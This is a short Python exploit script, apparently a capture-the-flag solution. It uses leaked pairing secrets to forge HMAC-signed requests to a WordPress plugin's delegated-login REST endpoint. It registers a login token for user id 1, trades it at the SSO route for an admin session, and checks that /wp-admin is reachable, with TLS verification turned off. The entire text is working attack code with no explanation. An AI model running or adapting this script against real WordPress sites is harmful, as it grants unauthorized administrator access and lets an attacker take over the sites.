import base64
import hashlib
import hmac
import json
import secrets
import time
import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://chall.ctf.tccpens.id:30312"
c = json.load(open("pairing.json"))
s = requests.Session()
s.verify = False

vt = secrets.token_urlsafe(32)
ts, nonce = str(int(time.time())), secrets.token_hex(16)
body = json.dumps(
    {
        "token_hash": hashlib.sha256(vt.encode()).hexdigest(),
        "ttl": 120,
        "target_wp_user_id": 1,
        "correlation_id": "ctf-" + secrets.token_hex(6),
        "panel_user_email": "operator@example.invalid",
    },
    separators=(",", ":"),
).encode()
route = "/vulnity/v1/delegated-login"
msg = "\n".join(
    ["POST", route, ts, nonce, hashlib.sha256(body).hexdigest()]
).encode()
sig = base64.b64encode(
    hmac.new(c["signing_secret"].encode(), msg, hashlib.sha256).digest()
).decode()

headers = {
    "Content-Type": "application/json",
    "X-Site-Id": c["site_id"],
    "X-Vulnity-Token": c["token"],
    "X-Vulnity-Timestamp": ts,
    "X-Vulnity-Nonce": nonce,
    "X-Signature-V2": sig,
}
r = s.post(BASE + "/wp-json" + route, data=body, headers=headers)
print("register:", r.status_code)  # 201
r = s.get(
    BASE + "/wp-json/vulnity/v1/sso", params={"vt": vt}, allow_redirects=False
)
print("sso:", r.status_code, r.headers.get("Location"))  # 302 /wp-admin/
print("admin:", s.get(BASE + "/wp-admin/").status_code)  # 200
